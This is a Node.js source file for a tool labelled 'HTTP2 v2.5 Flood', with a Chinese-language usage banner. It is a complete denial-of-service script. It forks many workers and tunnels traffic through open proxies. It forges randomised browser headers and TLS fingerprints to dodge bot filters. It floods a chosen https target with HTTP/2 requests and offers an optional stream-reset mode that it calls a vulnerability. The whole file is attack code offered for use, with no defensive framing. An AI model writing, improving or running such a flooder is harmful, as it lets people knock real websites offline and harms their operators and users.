process.on('uncaughtException', function(er) {
    console.log(er);
});
process.on('unhandledRejection', function(er) {
    console.log(er);
});

process.on("SIGHUP", () => {
    return 1;
})
process.on("SIGCHLD", () => {
    return 1;
});

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.setMaxListeners(0);

const crypto = require("crypto");
const fs = require('fs');
const url = require('url');
const cluster = require('cluster');
const http2 = require('http2');
const tls = require('tls');
const colors = require('colors');
const net = require('net');

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

if (process.argv.length < 7) {
    console.clear();
    console.log(`
    ${`${'HTTP2 v2.5 Flood'.underline}`.italic}

    ${'方法：'.bold.underline}

        ${`node HTTP2.js ${'['.red.bold}目标${']'.red.bold} ${'['.red.bold}时间${']'.red.bold} ${'['.red.bold}线程${']'.red.bold} ${'['.red.bold}速率${']'.red.bold} ${'['.red.bold}代理${']'.red.bold} ${'('.red.bold}选项${')'.red.bold}`.italic}
        ${'node HTTP2.js https://google.com/ 300 5 50 proxy.txt'.italic}

    ${'选项：'.bold.underline}

        --debug         ${'true'.green}        ${'-'.red.bold}   ${`调试级别响应代码`.italic}
        --query         ${'1'.yellow}/${'2'.yellow}/${'3'.yellow}       ${'-'.red.bold}   ${'生成查询 [1：？q=wsqd]，[2：？wsqd]，[3：wsqd]'.italic}
        --randrate      ${'true'.green}        ${'-'.red.bold}   ${'随机请求速率'.italic}
        --reset         ${'true'.green}        ${'-'.red.bold}   ${'启用快速重置漏洞'.italic}
        --mix           ${'true'.green}        ${'-'.red.bold}   ${'随机的请求方法'.italic} [${'New'.green}]
        --tls           ${'1'.yellow}/${'2'.yellow}/${'3'.yellow}       ${'-'.red.bold}   ${`TLS 最大版本 [1: ${'TLSv1'.underline}], [2: ${'TLSv2'.underline}], [3: ${'TLSv3'.underline}].`.italic}
    `);
    process.exit(0);
}

const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]) || 10;
const rate = parseInt(process.argv[5]) || 64;
const proxyfile = process.argv[6] || 'proxies.txt';

function error(msg) {
    console.log(`   ${'['.red}${'error'.bold}${']'.red} ${msg}`);
    process.exit(0);
}

if (!proxyfile) { error("代理文件无效"); }
if (!target || !target.startsWith('https://')) { error("目标协议无效"); }
if (!duration || isNaN(duration) || duration <= 0) { error("时间格式无效"); }
if (!threads || isNaN(threads) || threads <= 0) { error("线程格式无效"); }
if (!rate || isNaN(rate) || rate <= 0) { error("速率格式无效"); }

const parsed = url.parse(target);
const methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"];
const proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');
if (proxies.length <= 0) { error("代理文件为空"); }

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

const options = [
    { flag: '--debug', value: get_option('--debug') },
    { flag: '--query', value: get_option('--query') },
    { flag: '--randrate', value: get_option('--randrate') },
    { flag: '--reset', value: get_option('--reset') },
    { flag: '--mix', value: get_option('--mix') },
    { flag: '--tls', value: get_option('--tls') },
];

function enabled(buf) {
    const flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);

    if (option === undefined) { return false; }

    const optionValue = option.value;

    if (optionValue === "true" || optionValue === true) {
        return true;
    } else if (optionValue === "false" || optionValue === false) {
        return false;
    } else if (!isNaN(optionValue)) {
        return parseInt(optionValue);
    } else {
        return false;
    }
}

function random_int(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function random_string(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

const random_char = () => {
    const pizda4 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    const randomIndex = Math.floor(Math.random() * pizda4.length);
    return pizda4[randomIndex];
};

function generate_headers() {
    const browserVersion = random_int(80, 90);

    const browsers = [
        { name: 'Google Chrome', ua: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36` },
        { name: 'Brave', ua: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36` },
        { name: 'Firefox', ua: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${browserVersion}.0) Gecko/20100101 Firefox/${browserVersion}.0` },
        { name: 'Safari', ua: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15` },
        { name: 'Edge', ua: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36 Edg/${browserVersion}.0.0.0` }
    ];
    const browser = browsers[Math.floor(Math.random() * browsers.length)];
    const sec_fetch_sites = ["same-site", "same-origin", "cross-site"];
    const sec_fetch_site = sec_fetch_sites[Math.floor(Math.random() * sec_fetch_sites.length)];

    const brandValue = `\"Not A Brand\";v=\"99\", \"${browser.name}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;

    const isBrave = browser.name === 'Brave';

    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

    const secGpcValue = isBrave ? "1" : undefined;

    const userAgent = browser.ua;
    const secChUa = `${brandValue}`;
    const currentRefererValue = 'https://' + random_string(6, 12) + ".net";
    let method;
    if (enabled('mix')) {
        method = methods[Math.floor(Math.random() * methods.length)];
    } else {
        method = "GET";
    }

    let query;
    let query_enabled = enabled('query');

    if (query_enabled) {
        switch (query_enabled) {
            case 1:
                query = `?q=${random_string(6, 12)}`;
                break;
            case 2:
                query = `?${random_string(6, 12)}`;
                break;
            case 3:
                query = random_string(6, 12);
                break;
            default:
                query = parsed.path;
                break;
        }
    }

    const headers = Object.entries({
        ":method": method,
        ":authority": parsed.hostname,
        ":scheme": "https",
        ":path": query_enabled ? query : parsed.path,
    }).concat(Object.entries({
        ...(Math.random() < 0.4 && { "cache-control": "max-age=0" }),
        ...("POST" && { "content-length": "0" }),
        "sec-ch-ua": secChUa,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": `\"Windows\"`,
        "upgrade-insecure-requests": "1",
        "user-agent": userAgent,
        "accept": acceptHeaderValue,
        ...(secGpcValue && { "sec-gpc": secGpcValue }),
        ...(Math.random() < 0.5 && { "sec-fetch-site": currentRefererValue ? sec_fetch_site : "none" }),
        ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
        ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
        ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        ...(currentRefererValue && { "referer": currentRefererValue }),
    }).filter(a => a[1] != null));

    const headers2 = Object.entries({
        ...(Math.random() < 0.3 && { [`x-client-session${random_char()}`]: `none${random_char()}` }),
        ...(Math.random() < 0.3 && { [`sec-ms-gec-version${random_char()}`]: `undefined${random_char()}` }),
        ...(Math.random() < 0.3 && { [`sec-fetch-users${random_char()}`]: `?0${random_char()}` }),
        ...(Math.random() < 0.3 && { [`x-request-data${random_char()}`]: `dynamic${random_char()}` }),
    }).filter(a => a[1] != null);

    for (let i = headers2.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [headers2[i], headers2[j]] = [headers2[j], headers2[i]];
    }

    const combinedHeaders = headers.concat(headers2);
    const headersObject = {};
    combinedHeaders.forEach(header => {
        headersObject[header[0]] = header[1];
    });

    return headersObject;
}

function attack() {
    const [proxy_host, proxy_port] = proxies[Math.floor(Math.random() * proxies.length)].split(':');

    let tls_conn;

    const socket = net.connect(Number(proxy_port), proxy_host, () => {
        var tls_version = enabled('tls');
        if (tls_version) {
            switch (tls_version) {
                case 1:
                    tls_version = 'TLSv1.1';
                    break;
                case 2:
                    tls_version = 'TLSv1.2';
                    break;
                case 3:
                    tls_version = 'TLSv1.3';
                    break;
                default:
                    tls_version = 'TLSv1.3';
                    break;
            }
        } else {
            tls_version = 'TLSv1.3';
        }

        socket.once('data', () => {
            const client = http2.connect(parsed.href, {
                protocol: "https:",
                settings: {
                    headerTableSize: 65536,
                    maxConcurrentStreams: 1000,
                    initialWindowSize: 6291456 * 10,
                    maxHeaderListSize: 262144 * 10,
                    enablePush: false
                },
                createConnection: () => {
                    tls_conn = tls.connect({
                        host: parsed.host,
                        ciphers: ciphers,
                        echdCurve: "GREASE:X25519:x25519",
                        servername: parsed.host,
                        minVersion: 'TLSv1.1',
                        maxVersion: tls_version,
                        secure: true,
                        requestCert: true,
                        rejectUnauthorized: false,
                        ALPNProtocols: ['h2'],
                        socket: socket,
                    });
                    tls_conn.allowHalfOpen = true;
                    tls_conn.setNoDelay(true);
                    tls_conn.setKeepAlive(true, 60 * 1000);
                    tls_conn.setTimeout(10000);
                    tls_conn.setMaxListeners(0);
                    return tls_conn;
                },
            }, function () {

                let headers = generate_headers();

                function request() {
                    if (client.destroyed) { return }
                    for (let i = 0; i < rate; i++) {
                        const req = client.request(headers);
                        function handler(res) {
                            const status = res[':status'];
                            let coloredStatus;
                            switch (true) {
                                case status < 500 && status >= 400 && status !== 404:
                                    coloredStatus = status.toString().red;
                                    break;
                                case status >= 300 && status < 400:
                                    coloredStatus = status.toString().yellow;
                                    break;
                                case status === 503:
                                    coloredStatus = status.toString().cyan;
                                    break;
                                default:
                                    coloredStatus = status.toString().green;
                                    break;
                            }
                            if (enabled('debug')) {
                                console.log(`[${'HTTP2'.bold}] | (${colors.magenta(`${proxy_host}`.underline)}) ${headers[":authority"]}${headers[":path"]} [${coloredStatus}]`);
                            }
                        }
                        req.on("response", (res) => {
                            handler(res);
                        }).end();

                        if (enabled('reset')) {
                            (async () => {
                                while (true) {
                                    await new Promise(resolve => setTimeout(resolve, random_int(1000, 2000)));
                                    await req.close(http2.constants.NGHTTP2_CANCEL);
                                    await req.end()

                                    await client.destroy();
                                }
                            })();
                        }
                    }

                    let _rate;
                    if (enabled('randrate')) {
                        _rate = random_int(1, 90);
                    } else {
                        _rate = rate;
                    }
                    setTimeout(() => {
                        request();
                    }, 1000 / _rate);
                }
                request();
            }).on('error', (err) => {
                if (err.code === "ERR_HTTP2_GOAWAY_SESSION" || err.code === "ECONNRESET" || err.code == "ERR_HTTP2_ERROR") {
                    client.close();
                }
            });
        }).on('error', () => {
            tls_conn.destroy();
        });
        socket.write(`CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost: ${parsed.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    }).once('close', () => {
        if (tls_conn) { tls_conn.end(() => { tls_conn.destroy(); attack(); }); }
    });
}

if (cluster.isMaster) {
    let _options = "";
    for (var x = 0; x < options.length; x++) {
        if (options[x].value !== undefined) {
            _options += `${(options[x].flag).replace('--', '')}, `;
        }
    }

    console.clear();
    console.log(`
            ${'方法'.bold}      ${'-'.red}   ${'['.red} ${`HTTP2 v2.5`.italic} ${']'.red} 
            ${'目标'.bold}      ${'-'.red}   ${'['.red} ${`${target}`.italic} ${']'.red} 
            ${'时间'.bold}      ${'-'.red}   ${'['.red} ${`${duration}`.italic} ${']'.red} 
            ${'线程'.bold}      ${'-'.red}   ${'['.red} ${`${threads}`.italic} ${']'.red} 
            ${'速率'.bold}      ${'-'.red}   ${'['.red} ${`${rate}`.italic} ${']'.red}
            ${'选项'.bold}      ${'-'.red}   ${'['.red} ${`${_options}`.italic} ${']'.red}`);

    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }
} else {
    setInterval(attack);
    setTimeout(() => {
        process.exit(1);
    }, duration * 1000);
}
